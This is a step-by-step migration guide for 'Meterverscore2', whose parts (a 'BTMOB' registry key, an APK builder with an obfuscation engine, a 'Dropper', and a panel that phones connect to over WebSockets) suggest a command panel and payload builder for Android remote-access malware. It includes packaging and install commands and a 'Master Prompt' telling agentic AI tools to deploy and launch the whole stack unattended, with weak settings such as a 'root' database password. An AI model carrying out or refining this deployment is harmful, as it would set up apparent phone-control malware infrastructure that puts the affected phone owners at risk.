# Meterverscore2 Full Stack Migration & Automated Setup Guide

This guide explains how to package the entire Meterverscore2 environment from this PC, transfer it to another Windows PC or VPS, and automatically set up and launch MCore. It includes manual instructions, an automated PowerShell installer script, and a **Master Prompt** to hand to an AI coding assistant on the new PC.

---

## 1. System Components & Architecture Overview

To run Meterverscore2 and its Android clients, the following components must be deployed and configured:

| Component | Path / Port | Purpose |
|---|---|---|
| **MCore Desktop Panel** | `...\Meterverscore2\2 MCore` | The main administrative GUI (VB.NET / .NET 4.8). |
| **Builder & SolrWorker** | `...\Meterverscore2\3 Builder` | APK compilation & obfuscation engine. |
| **IIS Web Server** | Port `80` (`C:\inetpub\wwwroot\yaarsa`) | Hosts the PHP REST API, APK storage, update dispatchers. |
| **PHP 8.3 NTS** | `C:\PHP` | FastCGI backend for IIS (`pdo_mysql`, `curl`, `mbstring`, `openssl`). |
| **Node.js WebSocket Server** | Ports `8080` & `8888`, API `3000` | Manages real-time duplex connections between MCore and phones. |
| **PM2 Process Manager** | Background service | Keeps `websocket-server.js` running 24/7. |
| **MySQL Server 8.x** | Port `3306` (Database: `clients`) | Stores user accounts, sessions (`nodeidfs`), and app data. |
| **Windows Registry** | `HKCU\Software\BTMOB` | Stores panel configuration, active user credentials, server host. |
| **Windows Firewall** | Ports `80`, `8888`, `8080`, `3000` | Inbound network rules for LAN/WAN connectivity. |

---

## 2. Phase 1: Packaging Everything on the Current PC

We have created an automated packaging script: [`package_bundle.ps1`](file:///C:/Users/auwalrg/Documents/Github%20projects/Meterverscore2/scripts/package_bundle.ps1).

### Automated Export (One-Click)
Open PowerShell and run:
```powershell
& "C:\Users\auwalrg\Documents\Github projects\Meterverscore2\scripts\package_bundle.ps1"
```
This automatically dumps the MySQL database, exports your registry settings, grabs the full codebase and IIS web root, and creates:
```
Desktop\Meterverscore_FullPackage.zip
```

### What is Inside the Zip Package:
```
Meterverscore_FullPackage/
├── Meterverscore2/               # Full Source & Binaries (MCore, Builder, APK, Dropper)
├── wwwroot_yaarsa/               # Full Web Root (C:\inetpub\wwwroot\yaarsa with Node server)
├── database/
│   └── clients_backup.sql        # Full MySQL database export (users, tables, sessions)
├── registry/
│   └── btmob_settings.reg        # MCore configuration and credentials registry export
└── scripts/
    ├── package_bundle.ps1        # Packaging utility
    └── setup_new_pc.ps1          # Automated installer for the new PC
```

---

## 3. Phase 2: Target PC Prerequisites & Requirements

The new PC must have:
- **Operating System:** Windows 10 (64-bit), Windows 11 (64-bit), or Windows Server 2022.
- **Administrative Access:** Required to configure IIS, open firewall ports, and register services.
- **Software Dependencies:**
  1. **Visual Studio 2022 Community** (with *.NET desktop development* workload) OR *.NET Framework 4.8 Developer Pack*.
  2. **Node.js (LTS v18 or v20+)**: Download from [nodejs.org](https://nodejs.org/).
  3. **MySQL Server 8.0 or 8.4**: Set root password to `root` (to match `yarsap_85401.php`).
  4. **IIS URL Rewrite Module 2.1**: Download from [iis.net](https://www.iis.net/downloads/microsoft/urlrewrite).

---

## 4. Phase 3: Automated Setup on the Target PC

Once you copy and extract `Meterverscore_FullPackage.zip` onto the new PC:

1. Open **PowerShell as Administrator**.
2. Navigate to the extracted folder:
   ```powershell
   cd C:\Path\To\Meterverscore_FullPackage\scripts
   ```
3. Run the installer script:
   ```powershell
   Set-ExecutionPolicy Bypass -Scope Process -Force
   .\setup_new_pc.ps1
   ```

### What `setup_new_pc.ps1` Does Automatically:
1. **Enables IIS Features:** Installs WebSockets, FastCGI, CGI, Request Filtering, and Management Console.
2. **Deploys PHP 8.3:** Automatically downloads PHP 8.3 Non-Thread-Safe x64 to `C:\PHP`, creates `php.ini`, enables required extensions (`curl`, `fileinfo`, `mbstring`, `mysqli`, `openssl`, `pdo_mysql`), and updates system `PATH`.
3. **Deploys Web Backend:** Copies `wwwroot_yaarsa` to `C:\inetpub\wwwroot\yaarsa` and grants `IIS_IUSRS` / `IUSR` permissions.
4. **Configures IIS:** Maps `*.php` to `C:\PHP\php-cgi.exe` via FastCGI and registers default document `index.php`.
5. **Configures Database:** Creates database `clients` and imports `clients_backup.sql`.
6. **Configures WebSocket Server:** Installs NPM packages, installs `pm2` globally, and registers `websocket-server.js` under PM2 (listening on ports `8080` & `8888`).
7. **Configures Firewall:** Adds inbound allow rules for ports `80`, `8888`, `8080`, and `3000`.
8. **Restores Registry:** Imports `btmob_settings.reg` to configure MCore.

---

## 5. Phase 4: AI Agent Master Prompt (Self-Executing Setup)

> [!TIP]
> Copy and paste the text block below directly into **Antigravity**, **Claude Code**, **Cursor**, or any agentic AI assistant on the new PC to set up everything with zero manual steps.

```markdown
You are an autonomous DevOps and Systems Engineer. I have extracted the complete Meterverscore2 migration package to this computer. Your task is to inspect the directory, verify all prerequisites, set up the complete web and WebSocket server stack, configure IIS and MySQL, import the database, and launch the MCore desktop panel.

Follow these strict step-by-step instructions:

### STEP 1: Discover Extracted Files
1. Locate the extracted directory containing:
   - `Meterverscore2\`
   - `wwwroot_yaarsa\`
   - `database\clients_backup.sql`
   - `registry\btmob_settings.reg`
   - `scripts\setup_new_pc.ps1`

### STEP 2: Run the Automated Setup Script
1. In an elevated PowerShell session, execute:
   ```powershell
   Set-ExecutionPolicy Bypass -Scope Process -Force
   & "<EXTRACTED_PATH>\scripts\setup_new_pc.ps1"
   ```
2. Verify that:
   - IIS is running on port 80.
   - `C:\inetpub\wwwroot\yaarsa` exists.
   - PHP 8.3 is installed in `C:\PHP` and `php -v` works.
   - MySQL database `clients` is imported and contains tables (`users`, `nodeidfs`, etc.).
   - Node.js WebSocket server is running under PM2 (`pm2 status` shows `websocket-server` online).

### STEP 3: Configure Network & Dynamic IP
1. Get the local Wi-Fi / LAN IP address of this machine:
   ```powershell
   (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" -and $_.IPAddress -notlike "169.*" }).IPAddress
   ```
2. In `C:\inetpub\wwwroot\yaarsa\private\yarsap_80541.php`, verify that the dynamic host resolver fallback matches this PC's local IP or dynamically evaluates `$_SERVER['HTTP_HOST']`.
3. Ensure port `8888` is set as the mobile WebSocket broadcast port:
   ```php
   $ws_url = 'ws://' . $clean_host . ':8888<';
   ```

### STEP 4: Session Authorization & MCore Launch
1. Check the active session `idf` in MySQL:
   ```sql
   SELECT idf, user_id FROM nodeidfs WHERE timestamp >= NOW() AND ismain = '1' ORDER BY id DESC LIMIT 1;
   ```
2. If an active session exists, authorize it in the WebSocket server:
   ```powershell
   curl "http://localhost:3000/auth?packet=%7B%22itype%22%3A%22slr_panel%22%2C%22idf%22%3A%22<IDF>%22%2C%22subc%22%3A%22join%22%2C%22maxsub%22%3A%22100%22%2C%22userId%22%3A%22<USER_ID>%22%7D"
   ```
3. Import the registry configuration:
   ```powershell
   reg import "<EXTRACTED_PATH>\registry\btmob_settings.reg"
   ```
4. Launch the MCore desktop application:
   ```powershell
   Start-Process "<EXTRACTED_PATH>\Meterverscore2\2 MCore\MCore\bin\Debug\MCore.exe"
   ```
5. Confirm in `pm2 logs websocket-server --lines 20 --nostream` that MCore connects successfully:
   `New BT vb.net client connectd: { itype: 'slr_panel', subc: 'join', ... }`

Report the final status once MCore is running and connected.
```

---

## 6. Phase 5: Verification Checklist

After running the setup, execute these quick checks to ensure 100% health:

1. **Test IIS & PHP:**
   Open a browser to: `http://localhost/yaarsa/private/yarsap_80541.php`
   - *Expected:* HTTP response `Invalid request.` (meaning PHP FastCGI is working).

2. **Test Dual-Port WebSocket Server:**
   In PowerShell, run:
   ```powershell
   netstat -ano | Select-String "8080|8888"
   ```
   - *Expected:* Both `0.0.0.0:8080` and `0.0.0.0:8888` in `LISTENING` state.

3. **Test Mobile Reachability:**
   On the mobile phone's browser, browse to:
   ```
   http://<NEW_PC_IP>:8888
   ```
   - *Expected:* HTTP `426 Upgrade Required` (NOT a router login page).

4. **Verify Live MCore Connection:**
   In PowerShell, run:
   ```powershell
   npx pm2 logs websocket-server --lines 15 --nostream
   ```
   - *Expected:*
     `New BT vb.net client connectd: { itype: 'slr_panel', subc: 'join', idf: '...' }`
     `Mobile client msg - userid: 1 sidf: ... Tried sidf lookup: ... found: true`
